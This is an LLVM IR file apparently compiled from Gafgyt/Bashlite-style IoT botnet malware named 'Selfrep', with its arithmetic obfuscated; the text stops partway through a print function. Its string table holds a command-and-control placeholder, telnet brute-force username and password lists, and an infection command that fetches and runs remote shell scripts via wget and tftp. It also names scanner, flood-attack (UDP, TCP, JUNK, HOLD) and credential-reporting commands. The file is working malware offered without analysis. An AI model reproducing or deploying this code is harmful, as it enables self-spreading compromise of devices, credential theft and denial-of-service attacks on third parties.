; ModuleID = 'host/ir_sub/Selfrep.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.5 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.6 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@passwords = global [14 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0)], align 16
@.str.7 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.9 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.75 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.15 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.16 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.18 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.19 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.20 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.23 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.24 = private unnamed_addr constant [11 x i8] c"%d.%d.%d.0\00", align 1
@.str.25 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.26 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.28 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.29 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [181 x i8] c"cd /tmp || cd /var/run;wget http://ip/wbin.sh;sh wbin.sh;rm -rf wbin.sh;tftp -r tbin1.sh -g ip;sh tbin1.sh; tftp ip -c get tbin2.sh; sh tbin2.sh; rm -rf tbin1.sh tbin2.sh wbin.sh\0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [10 x i8] c"ulti-call\00", align 1
@.str.33 = private unnamed_addr constant [16 x i8] c"REPORT %s:%s:%s\00", align 1
@.str.34 = private unnamed_addr constant [7 x i8] c"gayfgt\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.36 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.37 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.38 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.39 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.42 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.44 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.45 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.46 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.48 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.49 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.50 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.51 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"FORK\0A\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.54 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.55 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.56 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.58 = private unnamed_addr constant [11 x i8] c"Killed %d.\00", align 1
@.str.59 = private unnamed_addr constant [13 x i8] c"None Killed.\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"LOLNOGTFO\00", align 1
@.str.61 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.62 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.63 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.64 = private unnamed_addr constant [9 x i8] c"[cpuset]\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.66 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.67 = private unnamed_addr constant [19 x i8] c"FAILED TO CONNECT\0A\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.69 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.70 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.72 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.73 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"LINK CLOSED\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, 1874382977
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, 1874382977
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = sub i32 %10, -352067937
  %12 = add i32 %11, -1640531527
  %13 = add i32 %12, -352067937
  %14 = add i32 %10, -1640531527
  %15 = sub i32 0, %13
  %16 = sub i32 0, -1640531527
  %17 = add i32 %15, %16
  %18 = sub i32 0, %17
  %19 = add i32 %13, -1640531527
  store i32 %18, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %20

; <label>:20:                                     ; preds = %67, %1
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 4096
  br i1 %22, label %23, label %72

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* %3, align 4
  %25 = add i32 %24, -1002625187
  %26 = sub i32 %25, 3
  %27 = sub i32 %26, -1002625187
  %28 = sub nsw i32 %24, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = add i32 %32, 1893067745
  %34 = sub i32 %33, 2
  %35 = sub i32 %34, 1893067745
  %36 = sub nsw i32 %32, 2
  %37 = sext i32 %35 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %31, -1
  %41 = and i32 -1098314877, %40
  %42 = xor i32 -1098314877, -1
  %43 = and i32 %31, %42
  %44 = xor i32 %39, -1
  %45 = and i32 %44, -1098314877
  %46 = and i32 %39, %42
  %47 = or i32 %41, %43
  %48 = or i32 %45, %46
  %49 = xor i32 %47, %48
  %50 = xor i32 %31, %39
  %51 = xor i32 %49, -1
  %52 = and i32 -1640531527, %51
  %53 = xor i32 -1640531527, -1
  %54 = and i32 %49, %53
  %55 = or i32 %52, %54
  %56 = xor i32 %49, -1640531527
  %57 = load i32, i32* %3, align 4
  %58 = xor i32 %55, -1
  %59 = and i32 %57, %58
  %60 = xor i32 %57, -1
  %61 = and i32 %55, %60
  %62 = or i32 %59, %61
  %63 = xor i32 %55, %57
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %65
  store i32 %62, i32* %66, align 4
  br label %67

; <label>:67:                                     ; preds = %23
  %68 = load i32, i32* %3, align 4
  %69 = sub i32 0, 1
  %70 = sub i32 %68, %69
  %71 = add nsw i32 %68, 1
  store i32 %70, i32* %3, align 4
  br label %20

; <label>:72:                                     ; preds = %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 0, %5
  %7 = sub i32 0, 1
  %8 = add i32 %6, %7
  %9 = sub i32 0, %8
  %10 = add i32 %5, 1
  %11 = xor i32 %9, -1
  %12 = xor i32 4095, -1
  %13 = xor i32 559793969, -1
  %14 = or i32 %11, %12
  %15 = or i32 559793969, %13
  %16 = xor i32 %14, -1
  %17 = and i32 %16, %15
  %18 = and i32 %9, 4095
  store i32 %17, i32* @rand_cmwc.i, align 4
  %19 = load i64, i64* %2, align 8
  %20 = load i32, i32* @rand_cmwc.i, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
  %24 = zext i32 %23 to i64
  %25 = mul i64 %19, %24
  %26 = load i32, i32* @c, align 4
  %27 = zext i32 %26 to i64
  %28 = sub i64 0, %27
  %29 = sub i64 %25, %28
  %30 = add i64 %25, %27
  store i64 %29, i64* %1, align 8
  %31 = load i64, i64* %1, align 8
  %32 = lshr i64 %31, 32
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* @c, align 4
  %34 = load i64, i64* %1, align 8
  %35 = load i32, i32* @c, align 4
  %36 = zext i32 %35 to i64
  %37 = add i64 %34, 6292094630274063714
  %38 = add i64 %37, %36
  %39 = sub i64 %38, 6292094630274063714
  %40 = add i64 %34, %36
  %41 = trunc i64 %39 to i32
  store i32 %41, i32* %3, align 4
  %42 = load i32, i32* %3, align 4
  %43 = load i32, i32* @c, align 4
  %44 = icmp ult i32 %42, %43
  br i1 %44, label %45, label %55

; <label>:45:                                     ; preds = %0
  %46 = load i32, i32* %3, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* %3, align 4
  %50 = load i32, i32* @c, align 4
  %51 = add i32 %50, 2137632187
  %52 = add i32 %51, 1
  %53 = sub i32 %52, 2137632187
  %54 = add i32 %50, 1
  store i32 %53, i32* @c, align 4
  br label %55

; <label>:55:                                     ; preds = %45, %0
  %56 = load i32, i32* %4, align 4
  %57 = load i32, i32* %3, align 4
  %58 = sub i32 0, %57
  %59 = add i32 %56, %58
  %60 = sub i32 %56, %57
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %62 = zext i32 %61 to i64
  %63 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %62
  store i32 %59, i32* %63, align 4
  ret i32 %59
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = add i64 %7, -3738713648579487828
  %9 = sub i64 %8, 1
  %10 = sub i64 %9, -3738713648579487828
  %11 = sub i64 %7, 1
  %12 = trunc i64 %10 to i32
  store i32 %12, i32* %5, align 4
  br label %13

; <label>:13:                                     ; preds = %22, %1
  %14 = load i8*, i8** %2, align 8
  %15 = load i32, i32* %4, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i8, i8* %14, i64 %16
  %18 = load i8, i8* %17, align 1
  %19 = sext i8 %18 to i32
  %20 = call i32 @isspace(i32 %19) #10
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %22, label %27

; <label>:22:                                     ; preds = %13
  %23 = load i32, i32* %4, align 4
  %24 = sub i32 0, 1
  %25 = sub i32 %23, %24
  %26 = add nsw i32 %23, 1
  store i32 %25, i32* %4, align 4
  br label %13

; <label>:27:                                     ; preds = %13
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %49

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = add i32 %44, 988683524
  %46 = add i32 %45, -1
  %47 = sub i32 %46, 988683524
  %48 = add nsw i32 %44, -1
  store i32 %47, i32* %5, align 4
  br label %28

; <label>:49:                                     ; preds = %41
  %50 = load i32, i32* %4, align 4
  store i32 %50, i32* %3, align 4
  br label %51

; <label>:51:                                     ; preds = %69, %49
  %52 = load i32, i32* %3, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp sle i32 %52, %53
  br i1 %54, label %55, label %76

; <label>:55:                                     ; preds = %51
  %56 = load i8*, i8** %2, align 8
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %56, i64 %58
  %60 = load i8, i8* %59, align 1
  %61 = load i8*, i8** %2, align 8
  %62 = load i32, i32* %3, align 4
  %63 = load i32, i32* %4, align 4
  %64 = sub i32 0, %63
  %65 = add i32 %62, %64
  %66 = sub nsw i32 %62, %63
  %67 = sext i32 %65 to i64
  %68 = getelementptr inbounds i8, i8* %61, i64 %67
  store i8 %60, i8* %68, align 1
  br label %69

; <label>:69:                                     ; preds = %55
  %70 = load i32, i32* %3, align 4
  %71 = sub i32 0, %70
  %72 = sub i32 0, 1
  %73 = add i32 %71, %72
  %74 = sub i32 0, %73
  %75 = add nsw i32 %70, 1
  store i32 %74, i32* %3, align 4
  br label %51

; <label>:76:                                     ; preds = %51
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, 138133664
  %81 = sub i32 %80, %79
  %82 = add i32 %81, 138133664
  %83 = sub nsw i32 %78, %79
  %84 = sext i32 %82 to i64
  %85 = getelementptr inbounds i8, i8* %77, i64 %84
  store i8 0, i8* %85, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %343, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %346

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %332

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %346

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %333

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %70

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = xor i32 %53, -1
  %55 = xor i32 2, -1
  %56 = xor i32 -595737033, -1
  %57 = and i32 %54, -595737033
  %58 = and i32 %53, %56
  %59 = and i32 %55, -595737033
  %60 = and i32 2, %56
  %61 = or i32 %57, %58
  %62 = or i32 %59, %60
  %63 = xor i32 %61, %62
  %64 = or i32 %54, %55
  %65 = xor i32 %64, -1
  %66 = or i32 -595737033, %56
  %67 = and i32 %65, %66
  %68 = or i32 %63, %67
  %69 = or i32 %53, 2
  store i32 %68, i32* %8, align 4
  br label %45

; <label>:70:                                     ; preds = %45
  br label %71

; <label>:71:                                     ; preds = %98, %70
  %72 = load i8*, i8** %5, align 8
  %73 = load i8, i8* %72, align 1
  %74 = zext i8 %73 to i32
  %75 = icmp sge i32 %74, 48
  br i1 %75, label %76, label %81

; <label>:76:                                     ; preds = %71
  %77 = load i8*, i8** %5, align 8
  %78 = load i8, i8* %77, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp sle i32 %79, 57
  br label %81

; <label>:81:                                     ; preds = %76, %71
  %82 = phi i1 [ false, %71 ], [ %80, %76 ]
  br i1 %82, label %83, label %101

; <label>:83:                                     ; preds = %81
  %84 = load i32, i32* %7, align 4
  %85 = mul nsw i32 %84, 10
  store i32 %85, i32* %7, align 4
  %86 = load i8*, i8** %5, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = sub i32 %88, -140047973
  %90 = sub i32 %89, 48
  %91 = add i32 %90, -140047973
  %92 = sub nsw i32 %88, 48
  %93 = load i32, i32* %7, align 4
  %94 = add i32 %93, -959820726
  %95 = add i32 %94, %91
  %96 = sub i32 %95, -959820726
  %97 = add nsw i32 %93, %91
  store i32 %96, i32* %7, align 4
  br label %98

; <label>:98:                                     ; preds = %83
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  br label %71

; <label>:101:                                    ; preds = %81
  %102 = load i8*, i8** %5, align 8
  %103 = load i8, i8* %102, align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 115
  br i1 %105, label %106, label %145

; <label>:106:                                    ; preds = %101
  %107 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %108 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 0
  %109 = load i32, i32* %108, align 8
  %110 = icmp ule i32 %109, 40
  br i1 %110, label %111, label %119

; <label>:111:                                    ; preds = %106
  %112 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 3
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr i8, i8* %113, i32 %109
  %115 = bitcast i8* %114 to i32*
  %116 = sub i32 0, 8
  %117 = sub i32 %109, %116
  %118 = add i32 %109, 8
  store i32 %117, i32* %108, align 8
  br label %124

; <label>:119:                                    ; preds = %106
  %120 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %107, i32 0, i32 2
  %121 = load i8*, i8** %120, align 8
  %122 = bitcast i8* %121 to i32*
  %123 = getelementptr i8, i8* %121, i32 8
  store i8* %123, i8** %120, align 8
  br label %124

; <label>:124:                                    ; preds = %119, %111
  %125 = phi i32* [ %115, %111 ], [ %122, %119 ]
  %126 = load i32, i32* %125, align 4
  %127 = sext i32 %126 to i64
  %128 = inttoptr i64 %127 to i8*
  store i8* %128, i8** %11, align 8
  %129 = load i8**, i8*** %4, align 8
  %130 = load i8*, i8** %11, align 8
